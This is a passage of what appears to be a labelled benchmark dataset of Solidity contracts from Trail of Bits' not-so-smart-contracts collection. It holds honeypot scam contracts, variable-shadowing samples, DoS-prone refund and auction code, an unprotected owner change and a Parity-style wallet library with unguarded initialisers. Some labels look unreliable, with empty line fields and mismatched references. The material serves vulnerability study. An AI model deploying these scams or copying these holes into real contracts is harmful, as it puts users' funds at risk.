    "vulnerable_lines": [],
    "vulnerability_type": "honeypot",
    "category": "honeypots",
    "severity": "low",
    "difficulty_tier": 3,
    "description": "# Honeypot Collection",
    "fix_description": "",
    "references": [
      "https://github.com/trailofbits/not-so-smart-contracts/tree/master/variable%20shadowing",
      "https://github.com/trailofbits/manticore",
      "https://github.com/trailofbits/not-so-smart-contracts/tree/master/reentrancy"
    ],
    "is_vulnerable": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "honeypots/KOTH/KOTH.sol",
    "pragma": "^0.4.19",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_honeypots_lottery",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Lottery.sol",
    "file_content": "/*\n * This is a distributed lottery that chooses random addresses as lucky addresses. If these\n * participate, they get the jackpot: 7 times the price of their bet.\n * Of course one address can only win once. The owner regularly reseeds the secret\n * seed of the contract (based on which the lucky addresses are chosen), so if you did not win,\n * just wait for a reseed and try again!\n *\n * Jackpot chance:   1 in 8\n * Ticket price: Anything larger than (or equal to) 0.1 ETH\n * Jackpot size: 7 times the ticket price\n *\n * HOW TO PARTICIPATE: Just send any amount greater than (or equal to) 0.1 ETH to the contract's address\n * Keep in mind that your address can only win once\n *\n * If the contract doesn't have enough ETH to pay the jackpot, it sends the whole balance.\n*/\n\ncontract OpenAddressLottery{\n    struct SeedComponents{\n        uint component1;\n        uint component2;\n        uint component3;\n        uint component4;\n    }\n    \n    address owner; //address of the owner\n    uint private secretSeed; //seed used to calculate number of an address\n    uint private lastReseed; //last reseed - used to automatically reseed the contract every 1000 blocks\n    uint LuckyNumber = 7; //if the number of an address equals 7, it wins\n        \n    mapping (address => bool) winner; //keeping track of addresses that have already won\n    \n    function OpenAddressLottery() {\n        owner = msg.sender;\n        reseed(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed\n    }\n    \n    function participate() payable {\n        if(msg.value<0.1 ether)\n            return; //verify ticket price\n        \n        // make sure he hasn't won already\n        require(winner[msg.sender] == false);\n        \n        if(luckyNumberOfAddress(msg.sender) == LuckyNumber){ //check if it equals 7\n            winner[msg.sender] = true; // every address can only win once\n            \n            uint win=msg.value*7; //win = 7 times the ticket price\n            \n            if(win>this.balance) //if the balance isnt sufficient...\n                win=this.balance; //...send everything we've got\n            msg.sender.transfer(win);\n        }\n        \n        if(block.number-lastReseed>1000) //reseed if needed\n            reseed(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed\n    }\n    \n    function luckyNumberOfAddress(address addr) constant returns(uint n){\n        // calculate the number of current address - 1 in 8 chance\n        n = uint(keccak256(uint(addr), secretSeed)[0]) % 8;\n    }\n    \n    function reseed(SeedComponents components) internal {\n        secretSeed = uint256(keccak256(\n            components.component1,\n            components.component2,\n            components.component3,\n            components.component4\n        )); //hash the incoming parameters and use the hash to (re)initialize the seed\n        lastReseed = block.number;\n    }\n    \n    function kill() {\n        require(msg.sender==owner);\n        \n        selfdestruct(msg.sender);\n    }\n    \n    function forceReseed() { //reseed initiated by the owner - for testing purposes\n        require(msg.sender==owner);\n        \n        SeedComponents s;\n        s.component1 = uint(msg.sender);\n        s.component2 = uint256(block.blockhash(block.number - 1));\n        s.component3 = block.difficulty*(uint)(block.coinbase);\n        s.component4 = tx.gasprice * 7;\n        \n        reseed(s); //reseed\n    }\n    \n    function () payable { //if someone sends money without any function call, just assume he wanted to participate\n        if(msg.value>=0.1 ether && msg.sender!=owner) //owner can't participate, he can only fund the jackpot\n            participate();\n    }\n\n}\n",
    "vulnerable_function": "OpenAddressLottery",
    "vulnerable_lines": [],
    "vulnerability_type": "honeypot",
    "category": "honeypots",
    "severity": "low",
    "difficulty_tier": 3,
    "description": "# Honeypot Collection",
    "fix_description": "",
    "references": [
      "https://github.com/trailofbits/not-so-smart-contracts/tree/master/variable%20shadowing",
      "https://github.com/trailofbits/manticore",
      "https://github.com/trailofbits/not-so-smart-contracts/tree/master/reentrancy"
    ],
    "is_vulnerable": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "honeypots/Lottery/Lottery.sol",
    "pragma": "unknown",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_honeypots_giftbox",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "GiftBox.sol",
    "file_content": "pragma solidity ^0.4.19;\n\ncontract NEW_YEARS_GIFT\n{\n    string message;\n    \n    bool passHasBeenSet = false;\n    \n    address sender;\n    \n    bytes32 public hashPass;\n\t\n    function() public payable{}\n    \n    function GetHash(bytes pass) public constant returns (bytes32) {return sha3(pass);}\n    \n    function SetPass(bytes32 hash)\n    public\n    payable\n    {\n        if( (!passHasBeenSet&&(msg.value > 1 ether)) || hashPass==0x0 )\n        {\n            hashPass = hash;\n            sender = msg.sender;\n        }\n    }\n    \n    function SetMessage(string _message)\n    public\n    {\n        if(msg.sender==sender)\n        {\n            message =_message;\n        }\n    }\n    \n    function GetGift(bytes pass)\n    external\n    payable\n    returns (string)\n    {\n        if(hashPass == sha3(pass))\n        {\n            msg.sender.transfer(this.balance);\n            return message;\n        }\n    }\n    \n    function Revoce()\n    public\n    payable\n    {\n        if(msg.sender==sender)\n        {\n            sender.transfer(this.balance);\n            message=\"\";\n        }\n    }\n    \n    function PassHasBeenSet(bytes32 hash)\n    public\n    {\n        if(msg.sender==sender&&hash==hashPass)\n        {\n           passHasBeenSet=true;\n        }\n    }\n}\n",
    "vulnerable_function": "GetHash",
    "vulnerable_lines": [],
    "vulnerability_type": "honeypot",
    "category": "honeypots",
    "severity": "low",
    "difficulty_tier": 3,
    "description": "# Honeypot Collection",
    "fix_description": "",
    "references": [
      "https://github.com/trailofbits/not-so-smart-contracts/tree/master/variable%20shadowing",
      "https://github.com/trailofbits/manticore",
      "https://github.com/trailofbits/not-so-smart-contracts/tree/master/reentrancy"
    ],
    "is_vulnerable": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "honeypots/GiftBox/GiftBox.sol",
    "pragma": "^0.4.19",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_honeypots_varloop",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "VarLoop.sol",
    "file_content": "pragma solidity ^0.4.18;\n\ncontract Test1\n{\n    address owner = msg.sender;\n    \n    function withdraw()\n    payable\n    public\n    {\n        require(msg.sender==owner);\n        owner.transfer(this.balance);\n    }\n    \n    function() payable {}\n    \n    function Test()\n    payable\n    public\n    {\n        if(msg.value>=1 ether)\n        {\n            \n            var i1 = 1;\n            var i2 = 0;\n            var amX2 = msg.value*2;\n            \n            while(true)\n            {\n                if(i1<i2)break;\n                if(i1>amX2)break;\n                \n                i2=i1;\n                i1++;\n            }\n            msg.sender.transfer(i2);\n        }\n    }\n}\n",
    "vulnerable_function": "withdraw",
    "vulnerable_lines": [],
    "vulnerability_type": "honeypot",
    "category": "honeypots",
    "severity": "low",
    "difficulty_tier": 3,
    "description": "# Honeypot Collection",
    "fix_description": "",
    "references": [
      "https://github.com/trailofbits/not-so-smart-contracts/tree/master/variable%20shadowing",
      "https://github.com/trailofbits/manticore",
      "https://github.com/trailofbits/not-so-smart-contracts/tree/master/reentrancy"
    ],
    "is_vulnerable": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "honeypots/VarLoop/VarLoop.sol",
    "pragma": "^0.4.18",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_variable shadowing_inherited_state",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "inherited_state.sol",
    "file_content": "contract Suicidal {\n  address owner;\n  function suicide() public returns (address) {\n    require(owner == msg.sender);\n    selfdestruct(owner);\n  }\n}\ncontract C is Suicidal {\n  address owner;\n  function C() {\n    owner = msg.sender;\n  }\n}\n",
    "vulnerable_function": "suicide",
    "vulnerable_lines": [],
    "vulnerability_type": "variable_shadowing",
    "category": "variable shadowing",
    "severity": "low",
    "difficulty_tier": 2,
    "description": "# Variable Shadowing\nVariable shadowing occurs when a variable declared within a certain scope (decision block, method, or inner class)\nhas the same name as a variable declared in an outer scope.",
    "fix_description": "",
    "references": [
      "https://github.com/ethereum/solidity/issues/973",
      "https://github.com/ethereum/solidity/issues/2563"
    ],
    "is_vulnerable": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "variable shadowing/inherited_state.sol",
    "pragma": "unknown",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_unchecked_external_call_kingoftheetherthrone",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "KingOfTheEtherThrone.sol",
    "file_content": "// A chain-game contract that maintains a 'throne' which agents may pay to rule.\n// See www.kingoftheether.com & https://github.com/kieranelby/KingOfTheEtherThrone .\n// (c) Kieran Elby 2016. All rights reserved.\n// v0.4.0.\n// Inspired by ethereumpyramid.com and the (now-gone?) \"magnificent bitcoin gem\".\n\n// This contract lives on the blockchain at 0xb336a86e2feb1e87a328fcb7dd4d04de3df254d0\n// and was compiled (using optimization) with:\n// Solidity version: 0.2.1-fad2d4df/.-Emscripten/clang/int linked to libethereum\n\n// For future versions it would be nice to ...\n// TODO - enforce time-limit on reign (can contracts do that without external action)?\n// TODO - add a random reset?\n// TODO - add bitcoin bridge so agents can pay in bitcoin?\n// TODO - maybe allow different return payment address?\npragma solidity ^0.4.19;\n\ncontract KingOfTheEtherThrone {\n\n    struct Monarch {\n        // Address to which their compensation will be sent.\n        address etherAddress;\n        // A name by which they wish to be known.\n        // NB: Unfortunately \"string\" seems to expose some bugs in web3.\n        string name;\n        // How much did they pay to become monarch?\n        uint claimPrice;\n        // When did their rule start (based on block.timestamp)?\n        uint coronationTimestamp;\n    }\n\n    // The wizard is the hidden power behind the throne; they\n    // occupy the throne during gaps in succession and collect fees.\n    address wizardAddress;\n\n    // Used to ensure only the wizard can do some things.\n    modifier onlywizard { if (msg.sender == wizardAddress) _; }\n\n    // How much must the first monarch pay?\n    uint constant startingClaimPrice = 100 finney;\n\n    // The next claimPrice is calculated from the previous claimFee\n    // by multiplying by claimFeeAdjustNum and dividing by claimFeeAdjustDen -\n    // for example, num=3 and den=2 would cause a 50% increase.\n    uint constant claimPriceAdjustNum = 3;\n    uint constant claimPriceAdjustDen = 2;\n\n    // How much of each claimFee goes to the wizard (expressed as a fraction)?\n    // e.g. num=1 and den=100 would deduct 1% for the wizard, leaving 99% as\n    // the compensation fee for the usurped monarch.\n    uint constant wizardCommissionFractionNum = 1;\n    uint constant wizardCommissionFractionDen = 100;\n\n    // How much must an agent pay now to become the monarch?\n    uint public currentClaimPrice;\n\n    // The King (or Queen) of the Ether.\n    Monarch public currentMonarch;\n\n    // Earliest-first list of previous throne holders.\n    Monarch[] public pastMonarchs;\n\n    // Create a new throne, with the creator as wizard and first ruler.\n    // Sets up some hopefully sensible defaults.\n    function KingOfTheEtherThrone() {\n        wizardAddress = msg.sender;\n        currentClaimPrice = startingClaimPrice;\n        currentMonarch = Monarch(\n            wizardAddress,\n            \"[Vacant]\",\n            0,\n            block.timestamp\n        );\n    }\n\n    function numberOfMonarchs() constant returns (uint n) {\n        return pastMonarchs.length;\n    }\n\n    // Fired when the throne is claimed.\n    // In theory can be used to help build a front-end.\n    event ThroneClaimed(\n        address usurperEtherAddress,\n        string usurperName,\n        uint newClaimPrice\n    );\n\n    // Fallback function - simple transactions trigger this.\n    // Assume the message data is their desired name.\n    function() {\n        claimThrone(string(msg.data));\n    }\n\n    // Claim the throne for the given name by paying the currentClaimFee.\n    function claimThrone(string name) {\n\n        uint valuePaid = msg.value;\n\n        // If they paid too little, reject claim and refund their money.\n        if (valuePaid < currentClaimPrice) {\n            msg.sender.send(valuePaid);\n            return;\n        }\n\n        // If they paid too much, continue with claim but refund the excess.\n        if (valuePaid > currentClaimPrice) {\n            uint excessPaid = valuePaid - currentClaimPrice;\n            msg.sender.send(excessPaid);\n            valuePaid = valuePaid - excessPaid;\n        }\n\n        // The claim price payment goes to the current monarch as compensation\n        // (with a commission held back for the wizard). We let the wizard's\n        // payments accumulate to avoid wasting gas sending small fees.\n\n        uint wizardCommission = (valuePaid * wizardCommissionFractionNum) / wizardCommissionFractionDen;\n\n        uint compensation = valuePaid - wizardCommission;\n\n        if (currentMonarch.etherAddress != wizardAddress) {\n            currentMonarch.etherAddress.send(compensation);\n        } else {\n            // When the throne is vacant, the fee accumulates for the wizard.\n        }\n\n        // Usurp the current monarch, replacing them with the new one.\n        pastMonarchs.push(currentMonarch);\n        currentMonarch = Monarch(\n            msg.sender,\n            name,\n            valuePaid,\n            block.timestamp\n        );\n\n        // Increase the claim fee for next time.\n        // Stop number of trailing decimals getting silly - we round it a bit.\n        uint rawNewClaimPrice = currentClaimPrice * claimPriceAdjustNum / claimPriceAdjustDen;\n        if (rawNewClaimPrice < 10 finney) {\n            currentClaimPrice = rawNewClaimPrice;\n        } else if (rawNewClaimPrice < 100 finney) {\n            currentClaimPrice = 100 szabo * (rawNewClaimPrice / 100 szabo);\n        } else if (rawNewClaimPrice < 1 ether) {\n            currentClaimPrice = 1 finney * (rawNewClaimPrice / 1 finney);\n        } else if (rawNewClaimPrice < 10 ether) {\n            currentClaimPrice = 10 finney * (rawNewClaimPrice / 10 finney);\n        } else if (rawNewClaimPrice < 100 ether) {\n            currentClaimPrice = 100 finney * (rawNewClaimPrice / 100 finney);\n        } else if (rawNewClaimPrice < 1000 ether) {\n            currentClaimPrice = 1 ether * (rawNewClaimPrice / 1 ether);\n        } else if (rawNewClaimPrice < 10000 ether) {\n            currentClaimPrice = 10 ether * (rawNewClaimPrice / 10 ether);\n        } else {\n            currentClaimPrice = rawNewClaimPrice;\n        }\n\n        // Hail the new monarch!\n        ThroneClaimed(currentMonarch.etherAddress, currentMonarch.name, currentClaimPrice);\n    }\n\n    // Used only by the wizard to collect his commission.\n    function sweepCommission(uint amount) onlywizard {\n        wizardAddress.send(amount);\n    }\n\n    // Used only by the wizard to collect his commission.\n    function transferOwnership(address newOwner) onlywizard {\n        wizardAddress = newOwner;\n    }\n\n}\n",
    "vulnerable_function": "KingOfTheEtherThrone",
    "vulnerable_lines": [],
    "vulnerability_type": "unchecked_return",
    "category": "unchecked_external_call",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "# Unchecked External Call",
    "fix_description": "",
    "references": [
      "https://www.kingoftheether.com/postmortem.html"
    ],
    "is_vulnerable": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "unchecked_external_call/KotET_source_code/KingOfTheEtherThrone.sol",
    "pragma": "^0.4.19",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_denial_of_service_list_dos",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "list_dos.sol",
    "file_content": "pragma solidity ^0.4.15;\n\ncontract CrowdFundBad {\n  address[] private refundAddresses;\n  mapping(address => uint) public refundAmount;\n\n  function refundDos() public {\n    for(uint i; i < refundAddresses.length; i++) {\n      require(refundAddresses[i].transfer(refundAmount[refundAddresses[i]]));\n    }\n  }\n}\n\ncontract CrowdFundPull {\n  address[] private refundAddresses;\n  mapping(address => uint) public refundAmount;\n\n  function withdraw() external {\n    uint refund = refundAmount[msg.sender];\n    refundAmount[msg.sender] = 0;\n    msg.sender.transfer(refund);\n  }\n}\n\n\n//This is safe against the list length causing out of gas issues\n//but is not safe against the payee causing the execution to revert\ncontract CrowdFundSafe {\n  address[] private refundAddresses;\n  mapping(address => uint) public refundAmount;\n  uint256 nextIdx;\n  \n  function refundSafe() public {\n    uint256 i = nextIdx;\n    while(i < refundAddresses.length && msg.gas > 200000) {\n      refundAddresses[i].transfer(refundAmount[i]);\n      i++;\n    }\n    nextIdx = i;\n  }\n}\n",
    "vulnerable_function": "refundDos",
    "vulnerable_lines": [],
    "vulnerability_type": "dos",
    "category": "denial_of_service",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "# Denial of Service",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_remediation": true,
    "context_level": "single_file",
    "original_source_path": "denial_of_service/list_dos.sol",
    "pragma": "^0.4.15",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_denial_of_service_auction",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "auction.sol",
    "file_content": "pragma solidity ^0.4.15;\n\n//Auction susceptible to DoS attack\ncontract DosAuction {\n  address currentFrontrunner;\n  uint currentBid;\n\n  //Takes in bid, refunding the frontrunner if they are outbid\n  function bid() payable {\n    require(msg.value > currentBid);\n\n    //If the refund fails, the entire transaction reverts.\n    //Therefore a frontrunner who always fails will win\n    if (currentFrontrunner != 0) {\n      //E.g. if recipients fallback function is just revert()\n      require(currentFrontrunner.send(currentBid));\n    }\n\n    currentFrontrunner = msg.sender;\n    currentBid         = msg.value;\n  }\n}\n\n\n//Secure auction that cannot be DoS'd\ncontract SecureAuction {\n  address currentFrontrunner;\n  uint    currentBid;\n  //Store refunds in mapping to avoid DoS\n  mapping(address => uint) refunds;\n\n  //Avoids \"pushing\" balance to users favoring \"pull\" architecture\n  function bid() payable external {\n    require(msg.value > currentBid);\n\n    if (currentFrontrunner != 0) {\n      refunds[currentFrontrunner] += currentBid;\n    }\n\n    currentFrontrunner = msg.sender;\n    currentBid         = msg.value;\n  }\n\n  //Allows users to get their refund from auction\n  function withdraw() external {\n    //Do all state manipulation before external call to\n    //avoid reentrancy attack\n    uint refund = refunds[msg.sender];\n    refunds[msg.sender] = 0;\n\n    msg.sender.send(refund);\n  }\n}\n",
    "vulnerable_function": "bid",
    "vulnerable_lines": [],
    "vulnerability_type": "dos",
    "category": "denial_of_service",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "# Denial of Service",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "denial_of_service/auction.sol",
    "pragma": "^0.4.15",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_unprotected_function_unprotected",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Unprotected.sol",
    "file_content": "pragma solidity ^0.4.15;\n\ncontract Unprotected{\n    address private owner;\n\n    modifier onlyowner {\n        require(msg.sender==owner);\n        _;\n    }\n\n    function Unprotected()\n        public \n    {\n        owner = msg.sender;\n    }\n\n    // This function should be protected\n    function changeOwner(address _newOwner) \n        public\n    {\n       owner = _newOwner;\n    }\n\n    function changeOwner_fixed(address _newOwner) \n        public \n        onlyowner\n    {\n       owner = _newOwner;\n    }\n}\n",
    "vulnerable_function": "Unprotected",
    "vulnerable_lines": [],
    "vulnerability_type": "access_control",
    "category": "unprotected_function",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "# Unprotected function\nMissing (or incorrectly used) modifier on a function allows an attacker to use sensitive functionality in the contract.",
    "fix_description": "",
    "references": [
      "https://etherscan.io/address/0xe82719202e5965Cf5D9B6673B7503a3b92DE20be#code",
      "https://blog.zeppelin.solutions/on-the-parity-wallet-multisig-hack-405a8c12e8f7",
      "https://github.com/BitGo/eth-multisig-v2/commit/8042188f08c879e06f097ae55c140e0aa7baaff8#diff-b498cc6fd64f83803c260abd8de0a8f5",
      "https://medium.com/nexus-mutual/responsible-vulnerability-disclosure-ece3fe3bcefa"
    ],
    "is_vulnerable": true,
    "has_remediation": true,
    "context_level": "single_file",
    "original_source_path": "unprotected_function/Unprotected.sol",
    "pragma": "^0.4.15",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_unprotected_function_walletlibrary",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "WalletLibrary.sol",
    "file_content": "// 0xa657491c1e7f16adb39b9b60e87bbb8d93988bc3#code\n//sol Wallet\n// Multi-sig, daily-limited account proxy/wallet.\n// @authors:\n// Gav Wood <g@ethdev.com>\n// inheritable \"property\" contract that enables methods to be protected by requiring the acquiescence of either a\n// single, or, crucially, each of a number of, designated owners.\n// usage:\n// use modifiers onlyowner (just own owned) or onlymanyowners(hash), whereby the same hash must be provided by\n// some number (specified in constructor) of the set of owners (specified in the constructor, modifiable) before the\n// interior is executed.\n\npragma solidity ^0.4.9;\n\ncontract WalletEvents {\n  // EVENTS\n\n  // this contract only has six types of events: it can accept a confirmation, in which case\n  // we record owner and operation (hash) alongside it.\n  event Confirmation(address owner, bytes32 operation);\n  event Revoke(address owner, bytes32 operation);\n\n  // some others are in the case of an owner changing.\n  event OwnerChanged(address oldOwner, address newOwner);\n  event OwnerAdded(address newOwner);\n  event OwnerRemoved(address oldOwner);\n\n  // the last one is emitted if the required signatures change\n  event RequirementChanged(uint newRequirement);\n\n  // Funds has arrived into the wallet (record how much).\n  event Deposit(address _from, uint value);\n  // Single transaction going out of the wallet (record who signed for it, how much, and to whom it's going).\n  event SingleTransact(address owner, uint value, address to, bytes data, address created);\n  // Multi-sig transaction going out of the wallet (record who signed for it last, the operation hash, how much, and to whom it's going).\n  event MultiTransact(address owner, bytes32 operation, uint value, address to, bytes data, address created);\n  // Confirmation still needed for a transaction.\n  event ConfirmationNeeded(bytes32 operation, address initiator, uint value, address to, bytes data);\n}\n\ncontract WalletAbi {\n  // Revokes a prior confirmation of the given operation\n  function revoke(bytes32 _operation) external;\n\n  // Replaces an owner `_from` with another `_to`.\n  function changeOwner(address _from, address _to) external;\n\n  function addOwner(address _owner) external;\n\n  function removeOwner(address _owner) external;\n\n  function changeRequirement(uint _newRequired) external;\n\n  function isOwner(address _addr) constant returns (bool);\n\n  function hasConfirmed(bytes32 _operation, address _owner) external constant returns (bool);\n\n  // (re)sets the daily limit. needs many of the owners to confirm. doesn't alter the amount already spent today.\n  function setDailyLimit(uint _newLimit) external;\n\n  function execute(address _to, uint _value, bytes _data) external returns (bytes32 o_hash);\n  function confirm(bytes32 _h) returns (bool o_success);\n}\n\ncontract WalletLibrary is WalletEvents {\n  // TYPES\n\n  // struct for the status of a pending operation.\n  struct PendingState {\n    uint yetNeeded;\n    uint ownersDone;\n    uint index;\n  }\n\n  // Transaction structure to remember details of transaction lest it need be saved for a later call.\n  struct Transaction {\n    address to;\n    uint value;\n    bytes data;\n  }\n\n  // MODIFIERS\n\n  // simple single-sig function modifier.\n  modifier onlyowner {\n    if (isOwner(msg.sender))\n      _;\n  }\n  // multi-sig function modifier: the operation must have an intrinsic hash in order\n  // that later attempts can be realised as the same underlying operation and\n  // thus count as confirmations.\n  modifier onlymanyowners(bytes32 _operation) {\n    if (confirmAndCheck(_operation))\n      _;\n  }\n\n  // METHODS\n\n  // gets called when no other function matches\n  function() payable {\n    // just being sent some cash?\n    if (msg.value > 0)\n      Deposit(msg.sender, msg.value);\n  }\n\n  // constructor is given number of sigs required to do protected \"onlymanyowners\" transactions\n  // as well as the selection of addresses capable of confirming them.\n  function initMultiowned(address[] _owners, uint _required) {\n    m_numOwners = _owners.length + 1;\n    m_owners[1] = uint(msg.sender);\n    m_ownerIndex[uint(msg.sender)] = 1;\n    for (uint i = 0; i < _owners.length; ++i)\n    {\n      m_owners[2 + i] = uint(_owners[i]);\n      m_ownerIndex[uint(_owners[i])] = 2 + i;\n    }\n    m_required = _required;\n  }\n\n  // Revokes a prior confirmation of the given operation\n  function revoke(bytes32 _operation) external {\n    uint ownerIndex = m_ownerIndex[uint(msg.sender)];\n    // make sure they're an owner\n    if (ownerIndex == 0) return;\n    uint ownerIndexBit = 2**ownerIndex;\n    var pending = m_pending[_operation];\n    if (pending.ownersDone & ownerIndexBit > 0) {\n      pending.yetNeeded++;\n      pending.ownersDone -= ownerIndexBit;\n      Revoke(msg.sender, _operation);\n    }\n  }\n\n  // Replaces an owner `_from` with another `_to`.\n  function changeOwner(address _from, address _to) onlymanyowners(sha3(msg.data)) external {\n    if (isOwner(_to)) return;\n    uint ownerIndex = m_ownerIndex[uint(_from)];\n    if (ownerIndex == 0) return;\n\n    clearPending();\n    m_owners[ownerIndex] = uint(_to);\n    m_ownerIndex[uint(_from)] = 0;\n    m_ownerIndex[uint(_to)] = ownerIndex;\n    OwnerChanged(_from, _to);\n  }\n\n  function addOwner(address _owner) onlymanyowners(sha3(msg.data)) external {\n    if (isOwner(_owner)) return;\n\n    clearPending();\n    if (m_numOwners >= c_maxOwners)\n      reorganizeOwners();\n    if (m_numOwners >= c_maxOwners)\n      return;\n    m_numOwners++;\n    m_owners[m_numOwners] = uint(_owner);\n    m_ownerIndex[uint(_owner)] = m_numOwners;\n    OwnerAdded(_owner);\n  }\n\n  function removeOwner(address _owner) onlymanyowners(sha3(msg.data)) external {\n    uint ownerIndex = m_ownerIndex[uint(_owner)];\n    if (ownerIndex == 0) return;\n    if (m_required > m_numOwners - 1) return;\n\n    m_owners[ownerIndex] = 0;\n    m_ownerIndex[uint(_owner)] = 0;\n    clearPending();\n    reorganizeOwners(); //make sure m_numOwner is equal to the number of owners and always points to the optimal free slot\n    OwnerRemoved(_owner);\n  }\n\n  function changeRequirement(uint _newRequired) onlymanyowners(sha3(msg.data)) external {\n    if (_newRequired > m_numOwners) return;\n    m_required = _newRequired;\n    clearPending();\n    RequirementChanged(_newRequired);\n  }\n\n  // Gets an owner by 0-indexed position (using numOwners as the count)\n  function getOwner(uint ownerIndex) external constant returns (address) {\n    return address(m_owners[ownerIndex + 1]);\n  }\n\n  function isOwner(address _addr) constant returns (bool) {\n    return m_ownerIndex[uint(_addr)] > 0;\n  }\n\n  function hasConfirmed(bytes32 _operation, address _owner) external constant returns (bool) {\n    var pending = m_pending[_operation];\n    uint ownerIndex = m_ownerIndex[uint(_owner)];\n\n    // make sure they're an owner\n    if (ownerIndex == 0) return false;\n\n    // determine the bit to set for this owner.\n    uint ownerIndexBit = 2**ownerIndex;\n    return !(pending.ownersDone & ownerIndexBit == 0);\n  }\n\n  // constructor - stores initial daily limit and records the present day's index.\n  function initDaylimit(uint _limit) {\n    m_dailyLimit = _limit;\n    m_lastDay = today();\n  }\n  // (re)sets the daily limit. needs many of the owners to confirm. doesn't alter the amount already spent today.\n  function setDailyLimit(uint _newLimit) onlymanyowners(sha3(msg.data)) external {\n    m_dailyLimit = _newLimit;\n  }\n  // resets the amount already spent today. needs many of the owners to confirm.\n  function resetSpentToday() onlymanyowners(sha3(msg.data)) external {\n    m_spentToday = 0;\n  }\n\n  // constructor - just pass on the owner array to the multiowned and\n  // the limit to daylimit\n  function initWallet(address[] _owners, uint _required, uint _daylimit) {\n    initDaylimit(_daylimit);\n    initMultiowned(_owners, _required);\n  }\n\n  // kills the contract sending everything to `_to`.\n  function kill(address _to) onlymanyowners(sha3(msg.data)) external {\n    suicide(_to);\n  }\n\n  // Outside-visible transact entry point. Executes transaction immediately if below daily spend limit.\n  // If not, goes into multisig process. We provide a hash on return to allow the sender to provide\n  // shortcuts for the other confirmations (allowing them to avoid replicating the _to, _value\n  // and _data arguments). They still get the option of using them if they want, anyways.\n  function execute(address _to, uint _value, bytes _data) external onlyowner returns (bytes32 o_hash) {\n    // first, take the opportunity to check that we're under the daily limit.\n    if ((_data.length == 0 && underLimit(_value)) || m_required == 1) {\n      // yes - just execute the call.\n      address created;\n      if (_to == 0) {\n        created = create(_value, _data);\n      } else {\n        if (!_to.call.value(_value)(_data))\n          throw;\n      }\n      SingleTransact(msg.sender, _value, _to, _data, created);\n    } else {\n      // determine our operation hash.\n      o_hash = sha3(msg.data, block.number);\n      // store if it's new\n      if (m_txs[o_hash].to == 0 && m_txs[o_hash].value == 0 && m_txs[o_hash].data.length == 0) {\n        m_txs[o_hash].to = _to;\n        m_txs[o_hash].value = _value;\n        m_txs[o_hash].data = _data;\n      }\n      if (!confirm(o_hash)) {\n        ConfirmationNeeded(o_hash, msg.sender, _value, _to, _data);\n      }\n    }\n  }\n\n  function create(uint _value, bytes _code) internal returns (address o_addr) {\n    assembly {\n      o_addr := create(_value, add(_code, 0x20), mload(_code))\n      jumpi(invalidJumpLabel, iszero(extcodesize(o_addr)))\n    }\n  }\n\n  // confirm a transaction through just the hash. we use the previous transactions map, m_txs, in order\n  // to determine the body of the transaction from the hash provided.\n  function confirm(bytes32 _h) onlymanyowners(_h) returns (bool o_success) {\n    if (m_txs[_h].to != 0 || m_txs[_h].value != 0 || m_txs[_h].data.length != 0) {\n      address created;\n      if (m_txs[_h].to == 0) {\n        created = create(m_txs[_h].value, m_txs[_h].data);\n      } else {\n        if (!m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data))\n          throw;\n      }\n\n      MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data, created);\n      delete m_txs[_h];\n      return true;\n    }\n  }\n\n  // INTERNAL METHODS\n\n  function confirmAndCheck(bytes32 _operation) internal returns (bool) {\n    // determine what index the present sender is:\n    uint ownerIndex = m_ownerIndex[uint(msg.sender)];\n    // make sure they're an owner\n    if (ownerIndex == 0) return;\n\n    var pending = m_pending[_operation];\n    // if we're not yet working on this operation, switch over and reset the confirmation status.\n    if (pending.yetNeeded == 0) {\n      // reset count of confirmations needed.\n      pending.yetNeeded = m_required;\n      // reset which owners have confirmed (none) - set our bitmap to 0.\n      pending.ownersDone = 0;\n      pending.index = m_pendingIndex.length++;\n      m_pendingIndex[pending.index] = _operation;\n    }\n    // determine the bit to set for this owner.\n    uint ownerIndexBit = 2**ownerIndex;\n    // make sure we (the message sender) haven't confirmed this operation previously.\n    if (pending.ownersDone & ownerIndexBit == 0) {\n      Confirmation(msg.sender, _operation);\n      // ok - check if count is enough to go ahead.\n      if (pending.yetNeeded <= 1) {\n        // enough confirmations: reset and run interior.\n        delete m_pendingIndex[m_pending[_operation].index];\n        